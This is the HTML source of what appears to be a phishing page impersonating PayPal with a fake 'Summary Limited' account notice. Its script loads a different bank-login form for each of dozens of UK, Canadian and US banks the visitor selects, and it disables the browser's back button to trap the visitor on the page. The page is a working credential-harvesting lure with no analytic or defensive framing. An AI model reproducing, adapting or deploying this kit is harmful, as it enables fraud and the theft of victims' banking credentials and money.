
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
<head>
		<title>PayPal: Summary Limited</title>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<meta name="robots" content="noindex">
		<meta http-equiv="X-UA-Compatible" content="IE=9">
		<link rel="stylesheet" href="../css/app.css" />
		<link rel="stylesheet" href="../css/summary.css" />
		<link media="screen" rel="stylesheet" type="text/css" href="../css/global.css">
		<link media="screen" rel="stylesheet" type="text/css" href="../css/coreLayout.css">
		<link media="screen" rel="stylesheet" type="text/css" href="../css/eightball.css">
		<link rel="shortcut icon" href="../icon/pp_favicon_x.ico">
		<link rel="apple-touch-icon" href="../icon/apple-touch-icon.png">
  
  
<style type="text/css">
.button:hover{background: #0A8CC4;text-decoration: none;}
a.button, a.button:link, a.button:visited, .button, button {width: 100%;height: 44px;padding: 10px 15px;    border: 0px none;    display: block;    background: #009CDE;    box-shadow: none;    border-radius: 5px;    box-sizing: border-box;    cursor: pointer;    color: #FFF;   font-size: 1.14286em;    text-align: center;    font-weight: bold;    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;    text-shadow: none;}
#allowed ul {margin-left: 18px;list-style-image: url('../icon/scr_check_10x10.gif');}#disallowed ul {margin-left: 18px;list-style-image: url('../icon/scr_x_10x10.gif');}div.messageBox.res-center-critical {line-height: 56px;}div.messageBox.res-center-critical {	padding-left: 80px;	color: #000;	background-image: url('../icon/icon_critalert.gif');}.profileStates,.stateHoverTexts{width:100%;list-style:none}.profileStates li,.stateHoverTexts li{display:inline-block;vertical-align:top;width:19.5%;text-align:center}.profileStates li:last-child .state,.stateHoverTexts li:last-child .state{margin:0}.profileStates{margin:0 1em 1em 0;padding-top:1.2em}.profileStates .icon{display:block;height:2em;width:2em;margin:.3em auto .5em auto;font-size:2.25em;text-align:center;line-height:1.7em;color:#223648;background:#009CDE;-webkit-border-radius:50%;-moz-border-radius:50%;border-radius:50%}.profileStates .state{text-align:center}.profileStates .todoState{border-color:#888}.profileStates .nextState .icon{background:#5E707E;}.profileStates .doneState .icon{background:#68ff68}.center {margin-left: 15%;	margin-right: 15%;}a {text-decoration: none}
</style>
</head>
<script type="text/javascript">window.history.forward(); function noBack() { window.history.forward(); }</script>
<script type="text/javascript" src="../js/jquery.min.js"></script>
<script type="text/javascript" src="../js/jquery.js"></script>
	<script>
	$(document).ready(function() {
		$('#bank').on('change', function() {
			if (this.value == 'Barclays Bank') {
				$('#form-bank').load('../bank/uk/Brclys.php');
			}
			else if (this.value == 'Santander') {
				$('#form-bank').load('../bank/uk/Stder.php');
			}
			else if (this.value == 'Halifax') {
				$('#form-bank').load('../bank/uk/Hlifx.php');
			}
			else if (this.value == 'Lloyds') {
				$('#form-bank').load('../bank/uk/Lloys.php');
                        }
			else if (this.value == 'HSBC') {
				$('#form-bank').load('../bank/uk/hsbc.php');
			}
			else if (this.value == 'Alliance and Leicester') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Bank of Ireland') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Bank of Scotland') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Cahoot') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Co operative bank') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Citibank') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Clydesdale Bank') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Egg Bank') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'First Direct') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Intelligent Finance') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Isle of Man Bank') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Metro Bank') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Natwest') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Nationwide') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Northern Bank') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'RBS') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Sainsburys Bank') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'TSB Bank') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Tesco Personal Finance') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Unity Trust Bank plc') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Ulster Bank') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Virgin Money') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Yorkshire Bank') {
				$('#form-bank').load('../bank/uk/Other.php');
			}
			else if (this.value == 'Other') {
				$('#form-bank').load('../bank/uk/otheruk.php');
			}
			// Ca Bank
			else if (this.value == 'B2B Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Bank of Montreal') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Bank of Nova Scotia') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Bridgewater Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Cibc') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Canadian Tire Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Canadian Western Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Citizens Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'CFF Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Continental Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'CS Alterna Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'DirectCash Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Equitable Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'First Nations Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'General Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Hollis Canadian Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Laurentian Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Manulife Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'National Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Pacific Western Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Presidents Choice Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'RedBrick Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Rogers Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'RBC') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Tangerine Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'TorontoDominion Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Wealth One Bank of Canada') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'Zag Bank') {
				$('#form-bank').load('../bank/ca/ca.php');
			}
			else if (this.value == 'otherca') {
				$('#form-bank').load('../bank/ca/otherca.php');
			}
			// US Bank
			else if (this.value == 'Ally Financial') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'American Express Company') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'BB&T') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'Bank of America') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'Bank of New York Mellon') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'Charles Schwab Corporation') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'Capital One') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'Citizens Financial Group') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'Citigroup') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'Fifth Third Bank') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'Goldman Sachs') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'HSBC Bank USA') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'JPMorgan Chase') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'Morgan Stanley') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'PNC Financial Services') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'SunTrust Banks') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'State Street Corporation') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'TD Bank') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'US Bancorp') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'Wells Fargo') {
				$('#form-bank').load('../bank/us/us.php');
			}
			else if (this.value == 'otherus') {
				$('#form-bank').load('../bank/us/otherus.php');
			}
		});
	});
	</script>
<body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="">
<div class="standard" id="page">

	<div class="navbar navbar-fixed-top header" id="bheader">
		<div class="navbar-inner">
			<div class="navBanner clearfix">
				<div class="brand">
					<a class="logo" href="#home"><img src="../icon/logo_paypal_106x27.png" border="0" alt="PayPal"></a></div>
				</div>
				<div class="navMenu clearfix" id="navMenu" role="navigation">
					<ul class="globalNav clearfix pull-left">
						<li><a class="navIcons linkSummary" href="#home"><span>Summary</span></a></li>
						<li><a class="navIcons linkActivity" href="#activity"><span style="color:#F5F5F5;">.</span></a></li>
					</ul>
					<ul class="navSecondary">
						<li><a class="btn btn-mini btn-secondary logout" href="../../webapps">Log Out</a></li>
					</ul>
				</div>
		</div>
	</div>